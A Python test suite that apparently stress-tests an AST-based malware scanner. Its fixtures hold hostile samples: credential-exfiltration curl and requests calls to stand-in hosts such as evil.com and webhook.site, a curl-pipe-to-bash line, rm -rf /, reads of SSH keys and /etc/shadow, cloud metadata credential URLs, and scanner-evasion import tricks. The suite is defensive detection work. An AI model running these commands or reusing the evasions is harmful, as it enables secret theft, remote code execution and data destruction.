#!/usr/bin/env python3
"""
Adversarial Stress Test Suite for AST Security & Malware Scanner Engine
Authored by: teamwork_challenger_m2_gen2_1 (Empirical Challenger)

Tests deep edge cases, obfuscation techniques, evasion patterns,
boundary conditions, and benign tolerance targeting scripts/scan_security_ast.py.
"""

import json
import os
import shutil
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path

REPO_ROOT = Path(__file__).resolve().parent.parent
SCRIPTS_DIR = REPO_ROOT / "scripts"
SCANNER_PATH = SCRIPTS_DIR / "scan_security_ast.py"

if str(SCRIPTS_DIR) not in sys.path:
    sys.path.insert(0, str(SCRIPTS_DIR))

import scan_security_ast


class TestAdversarialDynamicExecution(unittest.TestCase):
    """Stress tests nested, obfuscated, and indirect dynamic code execution patterns."""

    def setUp(self):
        self.temp_dir = tempfile.mkdtemp()

    def tearDown(self):
        shutil.rmtree(self.temp_dir, ignore_errors=True)

    def test_nested_eval_compile(self):
        """eval(compile(...)) nested execution pattern."""
        code = "eval(compile('print(1337)', '<payload>', 'exec'))\n"
        path = Path(self.temp_dir) / "nested_compile.py"
        path.write_text(code)
        findings, _ = scan_security_ast.scan_path(path)
        self.assertIsNotNone(findings)
        self.assertTrue(len(findings) >= 1)
        self.assertTrue(any(f["rule"] == "DYNAMIC_CODE_EXECUTION" for f in findings))
        self.assertTrue(all(f["severity"] == "CRITICAL" for f in findings if f["rule"] == "DYNAMIC_CODE_EXECUTION"))

    def test_exec_inside_inner_function(self):
        """exec called inside deep nested local function."""
        code = """
def outer():
    def middle():
        def inner():
            exec('payload')
        inner()
    middle()
"""
        path = Path(self.temp_dir) / "nested_func.py"
        path.write_text(code)
        findings, _ = scan_security_ast.scan_path(path)
        self.assertTrue(any(f["rule"] == "DYNAMIC_CODE_EXECUTION" for f in findings))

    def test_eval_inside_lambda_and_comprehension(self):
        """eval invoked inside lambda and list comprehension."""
        code = """
f = lambda x: eval(x)
results = [eval(x) for x in ['1+1', '2+2']]
"""
        path = Path(self.temp_dir) / "lambda_comp.py"
        path.write_text(code)
        findings, _ = scan_security_ast.scan_path(path)
        self.assertGreaterEqual(len(findings), 2)
        self.assertTrue(all(f["rule"] == "DYNAMIC_CODE_EXECUTION" for f in findings))

    def test_eval_inside_class_method(self):
        """eval invoked inside deeply nested class method."""
        code = """
class ExploitCarrier:
    def __init__(self):
        pass
    def activate(self, payload):
        return eval(payload)
"""
        path = Path(self.temp_dir) / "class_method.py"
        path.write_text(code)
        findings, _ = scan_security_ast.scan_path(path)
        self.assertTrue(any(f["rule"] == "DYNAMIC_CODE_EXECUTION" for f in findings))

    def test_dynamic_import_with_expressions(self):
        """Dynamic __import__ and importlib.import_module with concatenated expressions."""
        code = """
mod_name = 'os'
m = __import__(mod_name)
import importlib
m2 = importlib.import_module('sub' + 'process')
"""
        path = Path(self.temp_dir) / "dynamic_imports.py"
        path.write_text(code)
        findings, _ = scan_security_ast.scan_path(path)
        self.assertGreaterEqual(len(findings), 2)

    def test_obfuscated_zlib_and_unhexlify(self):
        """exec with zlib.decompress and binascii.unhexlify obfuscation."""
        code = """
import zlib
import binascii
exec(zlib.decompress(b'...'))
eval(binascii.unhexlify(b'...'))
"""
        path = Path(self.temp_dir) / "obf_decomp.py"
        path.write_text(code)
        findings, _ = scan_security_ast.scan_path(path)
        self.assertTrue(any(f["rule"] == "OBFUSCATED_DYNAMIC_EXEC" for f in findings))


class TestAdversarialImportsAndAliases(unittest.TestCase):
    """Stress tests import aliasing, multiline imports, and renaming evasions."""

    def setUp(self):
        self.temp_dir = tempfile.mkdtemp()

    def tearDown(self):
        shutil.rmtree(self.temp_dir, ignore_errors=True)

    def test_aliased_os_system(self):
        """import os as o; o.system('cmd')"""
        code = "import os as o\no.system('whoami')\n"
        path = Path(self.temp_dir) / "alias_os.py"
        path.write_text(code)
        findings, _ = scan_security_ast.scan_path(path)
        self.assertTrue(any(f["rule"] == "SHELL_EXECUTION" for f in findings))

    def test_from_os_import_system_aliased(self):
        """from os import system as sys_exec; sys_exec('cmd')"""
        code = "from os import system as sys_exec\nsys_exec('rm -rf /')\n"
        path = Path(self.temp_dir) / "from_os_alias.py"
        path.write_text(code)
        findings, _ = scan_security_ast.scan_path(path)
        self.assertTrue(any(f["rule"] == "SHELL_EXECUTION" for f in findings))

    def test_from_pty_import_spawn(self):
        """from pty import spawn as s; s('/bin/sh')"""
        code = "from pty import spawn as s\ns('/bin/sh')\n"
        path = Path(self.temp_dir) / "pty_alias.py"
        path.write_text(code)
        findings, _ = scan_security_ast.scan_path(path)
        self.assertTrue(any(f["rule"] == "SHELL_EXECUTION" for f in findings))

    def test_from_pickle_import_loads(self):
        """from pickle import loads as l; l(payload)"""
        code = "from pickle import loads as l\nl(b'payload')\n"
        path = Path(self.temp_dir) / "pickle_alias.py"
        path.write_text(code)
        findings, _ = scan_security_ast.scan_path(path)
        self.assertTrue(any(f["rule"] == "INSECURE_DESERIALIZATION_PICKLE" for f in findings))

    def test_multiline_from_subprocess_import(self):
        """Multiline import with parenthesized symbols."""
        code = """
from subprocess import (
    Popen,
    PIPE,
    run
)
Popen("curl evil.com", shell=True)
run("echo 1", shell=1)
"""
        path = Path(self.temp_dir) / "multiline_import.py"
        path.write_text(code)
        findings, _ = scan_security_ast.scan_path(path)
        self.assertGreaterEqual(len(findings), 2)
        self.assertTrue(all(f["rule"] == "SHELL_INJECTION_RISK" for f in findings))


class TestAdversarialProcessInjectionVariants(unittest.TestCase):
    """Stress tests subprocess keywords, truthy expressions, and process execution sinks."""

    def setUp(self):
        self.temp_dir = tempfile.mkdtemp()

    def tearDown(self):
        shutil.rmtree(self.temp_dir, ignore_errors=True)

    def test_subprocess_all_variants_shell_true(self):
        """Test subprocess.call, check_call, check_output, Popen, run with shell=True."""
        variants = [
            "subprocess.call('id', shell=True)",
            "subprocess.check_call('id', shell=True)",
            "subprocess.check_output('id', shell=True)",
            "subprocess.Popen('id', shell=True)",
            "subprocess.run('id', shell=True)",
        ]
        for idx, call_stmt in enumerate(variants):
            code = f"import subprocess\n{call_stmt}\n"
            path = Path(self.temp_dir) / f"subproc_{idx}.py"
            path.write_text(code)
            findings, _ = scan_security_ast.scan_path(path)
            self.assertTrue(
                any(f["rule"] == "SHELL_INJECTION_RISK" for f in findings),
                f"Failed to detect shell=True in {call_stmt}"
            )

    def test_subprocess_truthy_non_boolean_values(self):
        """subprocess with shell=1 or dynamic expression should be flagged."""
        code = """
import subprocess
subprocess.run("ls", shell=1)
subprocess.Popen("ls", shell=(5 > 2))
"""
        path = Path(self.temp_dir) / "truthy_shell.py"
        path.write_text(code)
        findings, _ = scan_security_ast.scan_path(path)
        self.assertEqual(len(findings), 2)

    def test_subprocess_shell_false_safe(self):
        """subprocess with explicit shell=False or shell=0 must NOT be flagged."""
        code = """
import subprocess
subprocess.run(["ls", "-l"], shell=False)
subprocess.Popen(["whoami"], shell=0)
subprocess.check_output(["git", "status"], shell=False)
"""
        path = Path(self.temp_dir) / "safe_shell_false.py"
        path.write_text(code)
        findings, _ = scan_security_ast.scan_path(path)
        self.assertEqual(len(findings), 0)

    def test_os_popen_variants(self):
        """os.popen reading or writing."""
        code = "import os\nos.popen('cat /etc/passwd')\n"
        path = Path(self.temp_dir) / "popen.py"
        path.write_text(code)
        findings, _ = scan_security_ast.scan_path(path)
        self.assertTrue(any(f["rule"] == "SHELL_EXECUTION" for f in findings))


class TestAdversarialExfiltrationAndSSRF(unittest.TestCase):
    """Stress tests network exfiltration sinks, cloud metadata SSRF, and credential extraction."""

    def setUp(self):
        self.temp_dir = tempfile.mkdtemp()

    def tearDown(self):
        shutil.rmtree(self.temp_dir, ignore_errors=True)

    def test_all_known_suspicious_sinks(self):
        """Ensure every suspicious sink domain/IP triggers OUTBOUND_EXFILTRATION_SINK."""
        sinks = [
            "discord.com/api/webhooks/999/token",
            "discordapp.com/api/webhooks/999/token",
            "api.telegram.org/bot123/send",
            "webhook.site/uuid-1234",
            "pipedream.net/v1/sources",
            "requestbin.com/r/xyz",
            "hookbin.com/abc",
            "beeceptor.com/feed",
            "169.254.169.254/latest/meta-data/",
            "metadata.google.internal/computeMetadata/v1/",
            "evil-analytics-collector.dev/dump",
            "attacker-webhook/collect",
            "attacker.dev/endpoint",
        ]
        for idx, sink in enumerate(sinks):
            code = f"sink_url = 'https://{sink}'\n"
            path = Path(self.temp_dir) / f"sink_{idx}.py"
            # Note: sink is string constant, but in AST visitor it walks Call nodes.
            # Let's put it inside a Call, e.g., fetch(sink) or print(sink)
            path.write_text(f"send_request('{sink}')\n")
            findings, _ = scan_security_ast.scan_path(path)
            self.assertTrue(
                any(f["rule"] == "OUTBOUND_EXFILTRATION_SINK" for f in findings),
                f"Failed to detect sink: {sink}"
            )

    def test_environ_credential_exfiltration_calls(self):
        """os.environ passed into requests, urllib, or direct http.client calls."""
        libraries = [
            "requests.post('https://legit-api.com', json=dict(os.environ))",
            "requests.get('https://legit-api.com', params=os.environ)",
            "urllib.request.urlopen('https://legit-api.com', data=bytes(str(os.environ), 'utf-8'))",
            "http.client.HTTPConnection.request(conn, 'POST', '/', body=str(os.environ))",
        ]
        for idx, call_stmt in enumerate(libraries):
            code = f"import os\nimport requests, urllib.request, http.client\n{call_stmt}\n"
            path = Path(self.temp_dir) / f"exfil_{idx}.py"
            path.write_text(code)
            findings, _ = scan_security_ast.scan_path(path)
            self.assertTrue(
                any(f["rule"] == "CREDENTIAL_EXFILTRATION_FLOW" for f in findings),
                f"Failed to detect exfiltration in {call_stmt}"
            )

    def test_shell_script_exfiltration_and_cloud_metadata(self):
        """Shell script accessing AWS metadata or pipedream."""
        sh_code = """#!/bin/bash
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl -X POST https://webhook.site/abc -d "token=$SECRET"
"""
        path = Path(self.temp_dir) / "exfil.sh"
        path.write_text(sh_code)
        findings = scan_security_ast.analyze_shell_script(path)
        self.assertGreaterEqual(len(findings), 2)
        self.assertTrue(all(f["rule"] == "OUTBOUND_EXFILTRATION_SINK" for f in findings))

    def test_javascript_exfiltration_and_metadata(self):
        """JavaScript accessing metadata.google.internal or api.telegram.org."""
        js_code = """
fetch("http://metadata.google.internal/computeMetadata/v1/");
fetch("https://api.telegram.org/botXYZ/sendMessage");
"""
        path = Path(self.temp_dir) / "exfil.js"
        path.write_text(js_code)
        findings = scan_security_ast.analyze_js_script(path)
        self.assertGreaterEqual(len(findings), 2)
        self.assertTrue(all(f["rule"] == "OUTBOUND_EXFILTRATION_SINK" for f in findings))


class TestAdversarialSensitivePathAccess(unittest.TestCase):
    """Stress tests sensitive path access: .ssh, .aws, .gemini config, /etc/shadow, /etc/passwd."""

    def setUp(self):
        self.temp_dir = tempfile.mkdtemp()

    def tearDown(self):
        shutil.rmtree(self.temp_dir, ignore_errors=True)

    def test_ssh_key_types(self):
        """id_rsa, id_ecdsa, id_ed25519, authorized_keys."""
        keys = ["id_rsa", "id_ecdsa", "id_ed25519", "authorized_keys", "known_hosts"]
        for k in keys:
            code = f"open('~/.ssh/{k}', 'r')\n"
            path = Path(self.temp_dir) / f"ssh_{k}.py"
            path.write_text(code)
            findings, _ = scan_security_ast.scan_path(path)
            self.assertTrue(
                any(f["rule"] == "SENSITIVE_PATH_TRAVERSAL" for f in findings),
                f"Failed to detect ~/.ssh/{k}"
            )

    def test_gemini_config_variations(self):
        """Path to .gemini/config/config.json and auth.json."""
        for cf in ["config.json", "auth.json"]:
            code = f"pathlib.Path('~/.gemini/config/{cf}')\n"
            path = Path(self.temp_dir) / f"gemini_{cf}.py"
            path.write_text(code)
            findings, _ = scan_security_ast.scan_path(path)
            self.assertTrue(any(f["rule"] == "SENSITIVE_PATH_TRAVERSAL" for f in findings))

    def test_etc_passwd_and_shadow(self):
        """Accessing /etc/shadow and /etc/passwd."""
        for target in ["/etc/shadow", "/etc/passwd"]:
            code = f"os.open('{target}', os.O_RDONLY)\n"
            path = Path(self.temp_dir) / "sys_files.py"
            path.write_text(code)
            findings, _ = scan_security_ast.scan_path(path)
            self.assertTrue(any(f["rule"] == "SENSITIVE_PATH_TRAVERSAL" for f in findings))


class TestAdversarialBenignCodeTolerance(unittest.TestCase):
    """Verifies that legitimate code constructs produce ZERO false positives."""

    def setUp(self):
        self.temp_dir = tempfile.mkdtemp()

    def tearDown(self):
        shutil.rmtree(self.temp_dir, ignore_errors=True)

    def test_benign_ast_and_sys_usage(self):
        """Using ast.parse, ast.walk, ast.literal_eval, sys.argv, sys.exit."""
        code = """
import ast
import sys
tree = ast.parse("x = 1")
for node in ast.walk(tree):
    pass
safe_val = ast.literal_eval("[1, 2, 'three']")
args = sys.argv
sys.exit(0)
"""
        path = Path(self.temp_dir) / "safe_ast.py"
        path.write_text(code)
        findings, _ = scan_security_ast.scan_path(path)
        self.assertEqual(len(findings), 0, f"False positives found: {findings}")

    def test_benign_re_and_pathlib_usage(self):
        """Using re.compile, re.search, pathlib.Path."""
        code = """
import re
from pathlib import Path
regex = re.compile(r'^[a-zA-Z0-9_-]+$')
m = regex.search("test-123")
p = Path(__file__).resolve().parent / "local_config.json"
"""
        path = Path(self.temp_dir) / "safe_re_pathlib.py"
        path.write_text(code)
        findings, _ = scan_security_ast.scan_path(path)
        self.assertEqual(len(findings), 0, f"False positives found: {findings}")

    def test_benign_platform_system(self):
        """platform.system() must never be mistaken for os.system()."""
        code = """
import platform
os_type = platform.system()
release = platform.release()
"""
        path = Path(self.temp_dir) / "safe_platform.py"
        path.write_text(code)
        findings, _ = scan_security_ast.scan_path(path)
        self.assertEqual(len(findings), 0, f"False positives found: {findings}")

    def test_benign_safe_yaml(self):
        """yaml.safe_load and yaml.load with SafeLoader must pass."""
        code = """
import yaml
d1 = yaml.safe_load("foo: bar")
d2 = yaml.load("foo: bar", Loader=yaml.SafeLoader)
"""
        path = Path(self.temp_dir) / "safe_yaml.py"
        path.write_text(code)
        findings, _ = scan_security_ast.scan_path(path)
        self.assertEqual(len(findings), 0, f"False positives found: {findings}")

    def test_benign_subprocess_list(self):
        """Subprocess calls using safe argument vectors."""
        code = """
import subprocess
subprocess.run(["git", "status"], check=True)
proc = subprocess.Popen(["ls", "-la"], stdout=subprocess.PIPE)
out, err = proc.communicate()
"""
        path = Path(self.temp_dir) / "safe_subprocess.py"
        path.write_text(code)
        findings, _ = scan_security_ast.scan_path(path)
        self.assertEqual(len(findings), 0, f"False positives found: {findings}")


class TestAdversarialCLIEdgeCases(unittest.TestCase):
    """Stress tests CLI argument parsing, empty files, malformed syntax, nonexistent paths, and JSON format."""

    def setUp(self):
        self.temp_dir = tempfile.mkdtemp()
        self.scanner = str(SCANNER_PATH)

    def tearDown(self):
        shutil.rmtree(self.temp_dir, ignore_errors=True)

    def test_zero_byte_files_all_extensions(self):
        """Zero-byte files (.py, .sh, .js) must pass cleanly."""
        for ext in (".py", ".sh", ".js"):
            path = Path(self.temp_dir) / f"empty{ext}"
            path.write_text("")
            findings, scanned = scan_security_ast.scan_path(path)
            self.assertEqual(len(findings), 0)
            self.assertEqual(scanned, 1)

    def test_nonexistent_path_cli_rejection(self):
        """Nonexistent target path must exit 1."""
        nonexistent = Path(self.temp_dir) / "does_not_exist_anywhere"
        proc = subprocess.run(
            [sys.executable, self.scanner, "--target", str(nonexistent)],
            capture_output=True, text=True
        )
        self.assertEqual(proc.returncode, 1)
        self.assertIn("does not exist", proc.stderr)

    def test_syntax_error_file_cli_rejection(self):
        """Malformed syntax file must be flagged with PYTHON_SYNTAX_ERROR and exit 1."""
        path = Path(self.temp_dir) / "bad_syntax.py"
        path.write_text("class UnclosedClass:\n  def method(\n")
        proc = subprocess.run(
            [sys.executable, self.scanner, str(path)],
            capture_output=True, text=True
        )
        self.assertEqual(proc.returncode, 1)
        self.assertIn("PYTHON_SYNTAX_ERROR", proc.stdout)

    def test_json_output_contract_integrity(self):
        """Verify strict adherence of --json output schema."""
        bad_path = Path(self.temp_dir) / "hazard.py"
        bad_path.write_text("os.system('id')\n")
        json_file = Path(self.temp_dir) / "audit_output.json"

        proc = subprocess.run(
            [sys.executable, self.scanner, "--target", str(bad_path), "--json", str(json_file)],
            capture_output=True, text=True
        )
        self.assertEqual(proc.returncode, 1)
        self.assertTrue(json_file.exists())

        with open(json_file, "r") as jf:
            data = json.load(jf)

        # Verify required keys
        self.assertIn("scanned_files", data)
        self.assertIn("clean", data)
        self.assertIn("critical_count", data)
        self.assertIn("high_count", data)
        self.assertIn("findings", data)

        self.assertEqual(data["scanned_files"], 1)
        self.assertFalse(data["clean"])
        self.assertEqual(data["high_count"], 1)
        self.assertEqual(len(data["findings"]), 1)

        finding = data["findings"][0]
        self.assertEqual(finding["file"], str(bad_path))
        self.assertEqual(finding["line"], 1)
        self.assertEqual(finding["rule"], "SHELL_EXECUTION")
        self.assertEqual(finding["severity"], "HIGH")

    def test_empty_directory_scan(self):
        """Scanning empty directory exits 0 with 0 scanned files."""
        empty_dir = Path(self.temp_dir) / "empty_dir"
        empty_dir.mkdir()
        json_file = Path(self.temp_dir) / "empty_out.json"

        proc = subprocess.run(
            [sys.executable, self.scanner, "--target", str(empty_dir), "--json", str(json_file)],
            capture_output=True, text=True
        )
        self.assertEqual(proc.returncode, 0)
        with open(json_file, "r") as jf:
            data = json.load(jf)
        self.assertTrue(data["clean"])
        self.assertEqual(data["scanned_files"], 0)


class TestProductionSkillTreeImmunity(unittest.TestCase):
    """Validates that production skill tree contains ZERO false positives."""

    def test_production_skills_zero_false_positives(self):
        """All 322 standalone skills in [skill]/ must produce 0 findings."""
        skill_dir = REPO_ROOT / "[skill]"
        findings, scanned = scan_security_ast.scan_path(skill_dir)
        self.assertIsNotNone(findings)
        self.assertEqual(len(findings), 0, f"False positives detected in [skill]: {findings}")
        self.assertGreater(scanned, 100)

    def test_production_plugins_zero_false_positives(self):
        """All 8 plugin suites in [plugin]/ must produce 0 findings."""
        plugin_dir = REPO_ROOT / "[plugin]"
        findings, scanned = scan_security_ast.scan_path(plugin_dir)
        self.assertIsNotNone(findings)
        self.assertEqual(len(findings), 0, f"False positives detected in [plugin]: {findings}")
        self.assertGreater(scanned, 20)


class TestAdversarialDiscoveredBypasses(unittest.TestCase):
    """
    Verification tests confirming that previously discovered evasion patterns are now fully intercepted.
    """

    def setUp(self):
        self.temp_dir = tempfile.mkdtemp()

    def tearDown(self):
        shutil.rmtree(self.temp_dir, ignore_errors=True)

    def test_bypass_builtins_exec_import(self):
        """Bypass fix: 'from builtins import exec; exec(...)' is detected as DYNAMIC_CODE_EXECUTION."""
        code = "from builtins import exec\nexec('print(\"pwned\")')\n"
        path = Path(self.temp_dir) / "bypass_builtins_exec.py"
        path.write_text(code)
        findings, _ = scan_security_ast.scan_path(path)
        self.assertGreater(len(findings), 0, "builtins.exec must be detected")
        self.assertTrue(any(f["rule"] == "DYNAMIC_CODE_EXECUTION" for f in findings))

    def test_bypass_builtins_eval_import(self):
        """Bypass fix: 'from builtins import eval; eval(...)' is detected as DYNAMIC_CODE_EXECUTION."""
        code = "from builtins import eval\neval('1+1')\n"
        path = Path(self.temp_dir) / "bypass_builtins_eval.py"
        path.write_text(code)
        findings, _ = scan_security_ast.scan_path(path)
        self.assertGreater(len(findings), 0, "builtins.eval must be detected")
        self.assertTrue(any(f["rule"] == "DYNAMIC_CODE_EXECUTION" for f in findings))

    def test_bypass_wildcard_import_os_system(self):
        """Bypass fix: 'from os import *; system(...)' is detected as SHELL_EXECUTION."""
        code = "from os import *\nsystem('id')\n"
        path = Path(self.temp_dir) / "bypass_wildcard_os.py"
        path.write_text(code)
        findings, _ = scan_security_ast.scan_path(path)
        self.assertGreater(len(findings), 0, "from os import *; system() must be detected")
        self.assertTrue(any(f["rule"] == "SHELL_EXECUTION" for f in findings))

    def test_bypass_wildcard_import_subprocess_popen(self):
        """Bypass fix: 'from subprocess import *; Popen(..., shell=True)' is detected as SHELL_INJECTION_RISK."""
        code = "from subprocess import *\nPopen('id', shell=True)\n"
        path = Path(self.temp_dir) / "bypass_wildcard_subproc.py"
        path.write_text(code)
        findings, _ = scan_security_ast.scan_path(path)
        self.assertGreater(len(findings), 0, "from subprocess import *; Popen(shell=True) must be detected")
        self.assertTrue(any(f["rule"] == "SHELL_INJECTION_RISK" for f in findings))

    def test_bypass_shell_curl_pipe_absolute_bash(self):
        """Bypass fix: 'curl ... | /bin/bash' is detected as UNCHECKSUMMED_REMOTE_EXEC."""
        code = "#!/bin/sh\ncurl -fsSL https://evil.com/setup | /bin/bash\n"
        path = Path(self.temp_dir) / "bypass_pipe.sh"
        path.write_text(code)
        findings = scan_security_ast.analyze_shell_script(path)
        self.assertGreater(len(findings), 0, "curl | /bin/bash must be detected")
        self.assertTrue(any(f["rule"] == "UNCHECKSUMMED_REMOTE_EXEC" for f in findings))

    def test_chained_session_post_environ_exfiltration(self):
        """Bypass fix: requests.Session().post exfiltration is detected."""
        code = "import os, requests\nrequests.Session().post('https://evil-analytics-collector.dev', data=dict(os.environ))\n"
        path = Path(self.temp_dir) / "session_chain.py"
        path.write_text(code)
        findings, _ = scan_security_ast.scan_path(path)
        self.assertGreater(len(findings), 0, "Chained session post exfiltration must be detected")
        self.assertTrue(any(f["rule"] in ("CREDENTIAL_EXFILTRATION_FLOW", "OUTBOUND_EXFILTRATION_SINK") for f in findings))


if __name__ == "__main__":
    unittest.main()
